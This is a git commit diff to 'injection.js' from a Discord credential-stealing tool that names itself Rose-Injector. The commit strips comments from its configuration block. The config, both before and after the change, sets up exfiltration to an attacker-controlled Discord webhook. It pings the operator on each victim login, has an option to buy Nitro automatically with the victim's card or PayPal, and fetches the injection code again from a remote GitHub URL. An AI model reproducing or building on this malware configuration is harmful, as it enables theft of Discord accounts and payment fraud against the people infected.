b9a063f93f206850433b8a908bb59e8cafe86fc6
Muhemmad6196 <121689484+Muhemmad6196@users.noreply.github.com>
2023-04-13 16:17:19 +0300

    Update injection.js

--- injection.js
+++ injection.js
@@ -6,18 +6,16 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
-  auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-  ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
-  ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: 'Rose-Injector', //name of the webhook thats gonna send the info
-  embed_icon: 'https://i.imgur.com/EZFAJXh.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-  embed_color: 16711680, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/injection.js', //injection url for when it reinjects
-  /**
-   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
-   **/
+  webhook: '%WEBHOOK%',
+  webhook_protector_key: '%WEBHOOK_KEY%',
+  auto_buy_nitro: false,
+  ping_on_run: true,
+  ping_val: '@everyone',
+  embed_name: 'Rose-Injector',
+  embed_icon: 'https://i.imgur.com/EZFAJXh.png',
+  embed_color: 16711680,
+  injection_url: 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/injection.js',
+
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
